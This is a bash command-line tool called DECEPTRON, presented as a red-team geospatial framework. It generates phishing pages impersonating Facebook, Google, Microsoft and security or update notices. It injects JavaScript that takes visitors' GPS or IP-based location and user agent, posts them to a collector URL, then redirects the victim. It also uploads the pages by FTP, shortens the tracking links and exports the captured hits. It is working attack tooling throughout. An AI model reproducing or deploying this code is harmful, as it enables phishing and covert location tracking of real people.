#!/bin/bash
# DECEPTRON Main CLI (fixed) — banner served from banner.py

VERSION="1.1"

banner() {
    python3 banner.py 2>/dev/null || cat <<'FALLBACK'

  ██╗  ██╗ DECEPTRON v1.1 — Red Team Geospatial Intelligence Framework
FALLBACK
}

help_menu() {
    banner
    cat <<'USAGE'
Usage: ./deceptron.sh <command>

Commands:
  setup       — Initialize environment and database
  server      — Start collector + dashboard server
  generate    — Create and deploy a phishing campaign
  list        — Show all campaigns
  dashboard   — Open dashboard in browser
  export      — Export data (json/csv)
  shorten     — Shorten a link
  status      — Check if server is running
  help        — Show this menu
USAGE
}

cmd_setup() { ./setup.sh; }

cmd_server() {
    echo "[+] Starting server... (Ctrl+C to stop)"
    python3 server.py
}

cmd_generate() {
    python3 - <<'PYEOF'
import json, os, sqlite3, uuid, ftplib
from init_db import init_db
from banner import print_banner

print_banner()

cfg = json.load(open("config.json"))
db_path = cfg.get("db_path", "db/hits.db")
init_db(db_path)

collector = cfg.get("collector_url", "").strip()
base_url = cfg.get("base_url", "").strip()
templates_dir = "templates"

if not collector:
    print("[!] collector_url not set in config.json — data will not reach you.")
    print("[!] Example: https://your-domain.com/log  (must be HTTPS)")
    collector = input("[?] Enter collector URL to use anyway: ").strip()
    if not collector:
        raise SystemExit("[!] Aborting: no collector URL.")

campaign = input("[?] Campaign name: ").strip()
while not campaign or "/" in campaign or ".." in campaign or any(c in campaign for c in "\"'`<>;"):
    campaign = input("[!] Invalid name. Campaign name: ").strip()

VALID_TEMPLATES = ("facebook", "google", "microsoft", "security", "update", "custom")
template = input("[?] Template (facebook/google/microsoft/security/update/custom): ").strip().lower()
if template not in VALID_TEMPLATES:
    print(f"[!] Unknown template, defaulting to 'facebook'")
    template = "facebook"
redirect = input("[?] Redirect URL after capture: ").strip() or "https://www.google.com"
session_id = uuid.uuid4().hex[:8]

if template == "custom":
    print("[?] Paste custom HTML (finish with an empty line):")
    lines = []
    while True:
        try:
            line = input()
        except EOFError:
            break
        if line == "" and lines and lines[-1] == "":
            break
        lines.append(line)
    html_body = "\n".join(lines).strip() or "<h1>Loading...</h1>"
else:
    with open(f"{templates_dir}/{template}.html") as f:
        html_body = f.read()

# Tracker script — json.dumps makes values quote/quote-injection safe
import json as _json
tracker_script = f"""
<script>
(function() {{
    const collector = {_json.dumps(collector)};
    const campaign = {_json.dumps(campaign)};
    const session = {_json.dumps(session_id)};
    const redirect = {_json.dumps(redirect)};

    function sendData(lat, lng, acc, source) {{
        fetch(collector, {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{
                id: campaign, session: session,
                lat: lat, lng: lng, acc: acc,
                ua: navigator.userAgent,
                ts: Math.floor(Date.now() / 1000),
                source: source
            }})
        }}).catch(function() {{}}).finally(function() {{
            window.location.href = redirect;
        }});
    }}

    function ipFallback() {{
        fetch('https://ipapi.co/json/')
            .then(function(r) {{ return r.json(); }})
            .then(function(d) {{ sendData(d.latitude || 0, d.longitude || 0, 5000, 'ip'); }})
            .catch(function() {{ sendData(0, 0, 99999, 'unknown'); }});
    }}

    if (navigator.geolocation) {{
        navigator.geolocation.getCurrentPosition(
            function(pos) {{ sendData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'gps'); }},
            ipFallback,
            {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
        );
    }} else {{
        ipFallback();
    }}
}})();
</script>
"""

if "</body>" in html_body:
    html_body = html_body.replace("</body>", tracker_script + "\n</body>")
else:
    html_body += tracker_script

out_dir = f"generated/{campaign}"
os.makedirs(out_dir, exist_ok=True)
out_path = f"{out_dir}/index.html"
with open(out_path, "w") as f:
    f.write(html_body)
print(f"[+] Generated: {out_path}")

if base_url:
    tracking_link = f"{base_url.rstrip('/')}/{campaign}/"
else:
    tracking_link = f"[local file] {out_path}"

ftp_host = cfg.get("ftp_host", "")
if ftp_host:
    try:
        ftp = ftplib.FTP(ftp_host, timeout=30)
        ftp.login(cfg.get("ftp_user", ""), cfg.get("ftp_pass", ""))
        ftp.cwd(cfg.get("ftp_path", "/public_html"))
        try:
            ftp.mkd(campaign)
        except Exception:
            pass
        ftp.cwd(campaign)
        with open(out_path, "rb") as f:
            ftp.storbinary("STOR index.html", f)
        ftp.quit()
        print(f"[+] Uploaded to: {tracking_link}")
    except Exception as e:
        print(f"[!] FTP upload failed: {e}")
        print(f"[!] Manual upload required: {out_path}")
else:
    print(f"[!] No FTP config. Manual upload: {out_path}")

conn = sqlite3.connect(db_path)
c = conn.cursor()
c.execute("""INSERT INTO campaigns (name, template_type, redirect_url, link)
             VALUES (?,?,?,?)
             ON CONFLICT(name) DO UPDATE SET
               template_type=excluded.template_type,
               redirect_url=excluded.redirect_url,
               link=excluded.link""",
          (campaign, template, redirect, tracking_link))
conn.commit()
conn.close()

print(f"[+] Tracking link: {tracking_link}")
PYEOF
}

cmd_list() {
    python3 - <<'PYEOF'
import sqlite3, datetime
from init_db import init_db
conn = sqlite3.connect(init_db())
c = conn.cursor()
c.execute("SELECT name, template_type, link, created_at FROM campaigns ORDER BY created_at DESC")
rows = c.fetchall()
print(f"{'Campaign':<20} {'Type':<10} {'Link':<45} {'Created'}")
print("-" * 95)
for r in rows:
    created = datetime.datetime.fromtimestamp(r[3]).strftime("%Y-%m-%d %H:%M") if r[3] else "?"
    print(f"{r[0]:<20} {r[1]:<10} {r[2]:<45} {created}")
if not rows:
    print("(no campaigns yet — run ./deceptron.sh generate)")
conn.close()
PYEOF
}

cmd_dashboard() {
    echo "[+] Dashboard: http://localhost:5000"
    command -v xdg-open >/dev/null && xdg-open http://localhost:5000
    command -v termux-open >/dev/null && termux-open http://localhost:5000
}

cmd_export() {
    fmt=${2:-json}
    case "$fmt" in
        json|csv) ;;
        *) echo "[!] Format must be json or csv"; return 1 ;;
    esac
    python3 - "$fmt" <<'PYEOF'
import sqlite3, json, csv, sys
from init_db import init_db
fmt = sys.argv[1]
conn = sqlite3.connect(init_db())
c = conn.cursor()
c.execute("SELECT * FROM hits ORDER BY timestamp DESC")
rows = c.fetchall()
cols = [d[0] for d in c.description]
if fmt == "json":
    with open("export.json", "w") as f:
        json.dump([dict(zip(cols, r)) for r in rows], f, indent=2)
    print("[+] Exported: export.json")
else:
    with open("export.csv", "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(cols)
        w.writerows(rows)
    print("[+] Exported: export.csv")
conn.close()
PYEOF
}

cmd_shorten() {
    url=$2
    if [ -z "$url" ]; then
        read -r -p "[?] URL to shorten: " url
    fi
    short=$(curl -s "https://tinyurl.com/api-create.php?url=$url")
    echo "[+] Short link: $short"
}

cmd_status() {
    if [ -f .deceptron.pid ]; then
        pid=$(cat .deceptron.pid)
        if ps -p "$pid" > /dev/null 2>&1; then
            echo "[+] Server running (PID: $pid)"
            echo "[+] Dashboard: http://localhost:5000"
            return
        fi
        rm -f .deceptron.pid
        echo "[!] Stale PID file removed"
    fi
    echo "[!] Server not running"
}

case "$1" in
    setup) cmd_setup ;;
    server) cmd_server ;;
    generate) cmd_generate ;;
    list) cmd_list ;;
    dashboard) cmd_dashboard ;;
    export) cmd_export "$@" ;;
    shorten) cmd_shorten "$@" ;;
    status) cmd_status ;;
    *) help_menu ;;
esac